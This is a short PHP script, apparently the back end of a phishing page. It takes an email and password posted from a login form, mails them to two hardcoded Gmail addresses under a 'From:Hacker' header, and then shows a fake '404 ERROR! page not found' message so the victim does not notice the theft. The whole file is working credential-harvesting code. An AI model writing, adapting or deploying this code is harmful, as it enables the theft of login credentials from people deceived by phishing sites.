<?php
if(isset($_POST['submit'])){
$name=$_POST['email'];
$pass=$_POST['pass'];
$t ="Palmararthuro@gmail.com";
$to ="lumocigwad@gmail.com";
$subject ="new user ";
$headers ="From :$name "; 
$message ="username ".$name ."password ".$pass;
$headers="From:Hacker";
mail($to,$subject,$message ,$headers);
mail ($t, $subject,$message, $headers);
echo "'<font color='red'>404 ERROR!  page not found</font>'";

}
?>
